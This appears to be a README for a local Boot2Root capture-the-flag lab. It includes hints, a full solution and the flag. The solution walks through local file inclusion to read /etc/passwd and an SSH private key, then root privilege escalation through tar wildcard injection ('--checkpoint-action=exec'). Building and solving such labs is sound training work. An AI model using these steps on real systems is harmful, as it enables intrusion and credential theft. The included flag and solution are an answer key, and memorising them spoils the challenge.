# Ghost Hunter Agency

## Challenge Description
The Paranormal Investigation Agency website has been compromised by digital ghosts! The agency's secure file system contains sensitive information about paranormal investigations. Your mission is to infiltrate their systems, gain access through their vulnerable website, and escalate your privileges to capture the flag.

## Difficulty
Medium

## Category
Boot2Root

## Setup Instructions
```bash
cd Boot2Root/Challenge\ 2/
docker-compose up -d
```

The challenge will be available at:
- Web: http://localhost:80
- SSH: ssh -p 2222 ghosthunter@localhost (requires the private key)

## Hints
1. The website has a file viewer function that might not properly restrict access to local files.
2. SSH authentication keys are typically stored in the user's .ssh directory.
3. The backup script runs with elevated privileges using a wildcard that can be exploited.
4. Look for SUDO permissions that could allow for command execution.

## Solution
1. Discover the Local File Inclusion vulnerability in the website's file viewer:
   ```
   http://localhost/viewer.php?file=/etc/passwd
   ```

2. Retrieve the SSH private key:
   ```
   http://localhost/viewer.php?file=/home/ghosthunter/.ssh/id_rsa
   ```
   or
   ```
   http://localhost/viewer.php?file=/root/ghosthunter_id_rsa
   ```

3. Save the key to a file, set permissions, and connect via SSH:
   ```bash
   chmod 600 id_rsa
   ssh -i id_rsa -p 2222 ghosthunter@localhost
   ```

4. Check for SUDO permissions and examine the backup note:
   ```bash
   sudo -l
   cat ~/backup_note.txt
   ```

5. Exploit the tar wildcard to execute commands as root:
   ```bash
   cd /tmp
   echo '#!/bin/bash' > shell.sh
   echo 'cat /root/flag.txt > /tmp/flag.txt' >> shell.sh
   echo 'chmod 644 /tmp/flag.txt' >> shell.sh
   chmod +x shell.sh
   touch -- "--checkpoint=1"
   touch -- "--checkpoint-action=exec=sh shell.sh"
   sudo tar -cf /backups/backup.tar *
   cat /tmp/flag.txt
   ```

## Flag
```
flag{gh0st_hunt3r_LFI_t0_RCE}
```

## Clean Up
```bash
docker-compose down
``` 